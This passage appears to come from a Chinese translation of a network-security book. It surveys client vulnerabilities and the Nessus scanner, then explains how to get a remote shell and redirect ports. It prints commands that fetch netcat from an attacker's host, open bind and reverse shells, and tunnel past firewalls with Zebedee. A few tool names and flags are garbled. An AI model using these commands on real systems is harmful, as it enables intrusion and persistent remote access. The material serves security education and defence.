
由 POP3 服务器处理。如果攻击者控制了 POP3 服务器，他或她可以迫使 POP3 服务器返回恶意数据，从而在 Netscape/Mozilla 用户的主机上执行任意命令。更多信息请参阅 <http://securityfocus.com/bid/6254>。

## BitcX 远程堆溢出漏洞

BitcX 是一款流行的 IRC（Internet Relay Chat，互联网中继聊天）客户端。当向 BitcX 客户端提供长主机名时，观察到内存损坏的情况。此漏洞可能被恶意的 IRC 服务器利用，以在执行 BitcX 的主机上执行命令。有关此漏洞的信息请参阅 <http://securityfocus.com/bid/7096>。

## PGP4Pine 长消息行缓冲区溢出漏洞

PGP4Pine 为 Pine 电子邮件客户端添加 PGP 支持。在 PGP4Pine 中发现了一个漏洞，该漏洞是由于对包含 PGP 数据的电子邮件进行边界检查不足而引发的。攻击者可以发送精心构造的恶意电子邮件来利用此漏洞，从而在运行 PGP4Pine 的主机上执行任意命令。请参见网站 <http://securityfocus.com/bid/7071> 以获取更多信息。

## 防止应用程序漏洞被利用

建议采取以下措施以最大程度地降低应用程序漏洞的易感性：

- 保持软件补丁为最新状态。
- 订阅漏洞监视列表，例如 Bugtraq。（访问 <http://securityfocus.com/cgi-bin/sfonline/subscribe.pl> 以获取更多信息。参见本书参考中心中的“在线资源”部分，其中提供了许多其他安全资源的链接。）

## Nessus

审计大量主机以排查远程漏洞是一项非常繁重的工作。Nessus 是一款安全扫描器，可用于对一组目标主机运行远程漏洞的自动化检查（见图 4-3）。虽然目前有许多商业网络扫描器可供选择，但 Nessus 值得一提，因为它免费、开源、可靠且非常灵活。扫描完成后，Nessus 会向客户端提供美观的漏洞报告，这些报告可以保存为多种格式，包括 HTML。Nessus 可在 [http://www.nessus.org/](http://www.nessus.org/) 获取。

![](img/77287f6ef97ef0bed6e23f6610950d06_159_0.png)

**图 4-3. 工作中的 Nessus**

Nessus 旨在支持客户端/服务器架构。Nessus 服务器（`nessusd`）负责针对目标主机执行漏洞检查。Nessus 客户端程序（`nessus`）可用于连接服务器以配置和生成检查。Nessus 客户端与服务器之间的通信是经过加密的。

由于 Nessus 的设计非常模块化，编写自己的安全检查很容易。Nessus 安全检查可以使用 C 编程语言或 Nessus 专有的 NASL（Nessus Attack Scripting Language，Nessus 攻击脚本语言）编写。有关 NASL 的详细信息，请参见第 10 章。

## 获取 Shell

一旦攻击者成功利用远程服务或应用程序，通过远程执行受害者主机上的任意命令，他或她就会希望获取远程 shell，以继续利用受害者主机。

### 使用 Netcat 获取远程 Shell

可以采取以下步骤获取远程 shell：

1. **上传 Netcat**
   Netcat 可用于通过网络发送远程 shell。首先，你必须将 Netcat 放置在存在漏洞的主机上。这可以通过在受害者主机上执行以下 tftp 命令来完成：

   ```
   tftp -i attacker's_ip_address nc
   ```

   当然，为了使上述上传成功，攻击者必须运行一个可访问的 TFTP 服务器，并且在该服务器的 TFTP 主目录（通常是 /tftpboot）中放置 Netcat 二进制文件。

   除了 TFTP，还可以在受害者机器上执行 `wget` 工具，以从攻击者的 Web 服务器上获取 Netcat 二进制文件：

   ```
   wget http://attacker's_ip_address/nc
   ```

   或者，攻击者可以使用 FTP 命令行客户端将 Netcat 二进制文件上传到受害者主机：

   ```
   ftp -n ftpscript
   ```

   其中 `ftpscript` 是一个包含以下内容的文本文件：

   ```
   open attacker's_ftp_server_ip_address
   user user_on_attacker's_ftp_server user_password
   bin
   get nc
   bye
   ```

   可以通过在存在漏洞的主机上运行以下 `echo` 命令来创建此 `ftpscript`：

   ```
   echo open attacker's_ftp_server_ip_address > ftpscript;
   echo user user_on_attacker's_ftp_server user_password >> ftpscript;
   echo bin >> ftpscript;
   echo get nc >> ftpscript;
   echo bye >> ftpscript
   ```

2. **使用 Netcat**
   一旦 Netcat 被放置在受害者机器上，就可以用它来监听任意端口，并在连接时提供 shell：

   ```
   ./nc -e /bin/sh -l -p 9999
   ```

   现在，攻击者只需连接到受害者的 9999 端口即可接收命令 shell：

   ```
   nc victim's_ip_address 9999
   ```

   还可以指示 Netcat 连接到入侵者的端口，以提供命令 shell。首先，攻击者必须在某个端口上监听：

   ```
   nc -v -n -l -p 9999
   ```

   现在，必须在受害者主机上执行以下操作：

   ```
   . / nc -e /bin/sh attacker's_ipaddress 9999
   ```

   Netcat 默认不启用 `-e` 选项，该选项用于在建立连接后执行程序。如果你想让 Netcat 支持 `-e` 标志，必须使用 `-DGAMPERING_SECURITY_HOLE` 标志编译 Netcat。请记住，在将 Netcat 二进制文件上传到受害者主机之前执行此操作。

### 使用 xterm 获取远程 Shell

如果受害者主机安装了 `xterm` 等 X 终端客户端软件，攻击者可以执行该程序以接收远程 shell：

```
xterm -display attacker's_ip_address:0.0 &
```

此命令将使 `xterm` 的一个实例在受害者主机上执行，并显示在攻击者的 X 服务器上。当然，攻击者必须首先运行以下命令，以允许 `xterm` 显示在他或她的 X 服务器上：

```
xhost +victim's_ip_address
```

### 防止攻击者获取远程 Shell

以下是一些你可以采取的步骤，以增加入侵者获取远程 shell 的难度：

- 配置防火墙以阻止所有未使用的端口。此外，收紧防火墙规则以限制出站连接。例如，仅用作 Web 服务器的主机必须不允许在任何端口上发起出站连接。
- 从生产主机中卸载 telnet、ftp、wget 和 ftp 等客户端软件。
- 从生产主机中卸载 X 程序和库。

## 端口重定向

端口重定向技术可用于绕过薄弱的防火墙规则，以连接到在防火墙过滤的端口上运行的服务。为了便于进行端口重定向，我们将使用 Zebedee，这是一个可用的命令行工具，位于 [http://www.winton.org.uk/zebedee/](http://www.winton.org.uk/zebedee/)。假设 Zebedee 在受害者机器上可用。如果不可用，请使用前面“上传 Netcat”部分描述的方法将 Zebedee 二进制文件上传到受害者主机。

### 本地端口重定向

假设入侵者需要连接到已被攻陷主机上的 MySQL 服务器。如果在被攻陷主机上或之前存在防火墙，且仅允许端口 80 的入站连接，入侵者可以在受害者机器上执行以下命令：

```
[victim_host]$ zebedee -T 80 -s 127.0.0.1:3306
```

接下来，入侵者可以在他或她的机器上执行以下命令：

```
[intruder's_host]$ zebedee -T 80 victim's_ip_address:3306:127.0.0.1:3306
```

这将导致入侵者主机上的 Zebedee 进程连接到受害者主机上监听 80 端口的 Zebedee 进程。现在，入侵者可以连接到他或她主机的 3306 端口（127.0.0.1），以便通过 Zebedee 隧道连接到受害者主机的 3306 端口。

> 入侵者可以在受害者主机上运行 `ifconfig` 和 `route -n` 命令，以识别可能允许连接到内部网络的额外网络卡。在上述 Zebedee 命令中，攻击者可以指定内部机器的 IP 地址，而不是 127.0.0.1。这将导致监听受害者主机 80 端口的 Zebedee 将流量重定向到指定的内部主机和端口。

### 远程端口重定向

考虑这种情况：受害者主机上或之前的防火墙不允许任何入站连接，且仅允许端口 80 的出站连接。

我们可以使用 Zebedee 执行远程端口转发，这将导致运行在入侵者主机上的 Zebedee 进程等待来自受害者主机上客户端 Zebedee 进程的连接。

